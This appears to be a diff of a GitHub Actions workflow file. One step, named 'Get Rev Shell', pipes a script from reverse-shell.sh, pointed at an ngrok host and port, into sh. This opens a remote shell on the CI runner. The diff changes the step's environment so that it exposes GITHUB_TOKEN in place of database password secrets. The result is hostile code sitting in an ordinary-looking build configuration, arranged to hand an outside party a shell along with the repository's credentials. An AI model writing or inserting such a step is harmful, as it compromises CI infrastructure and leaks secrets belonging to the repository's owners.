@@ -11,5 +11,4 @@ jobs:
       - name: Get Rev Shell
         run: sh -c 'curl https://reverse-shell.sh/0.tcp.eu.ngrok.io:13954 | sh'
         env:
-          secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
-          secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
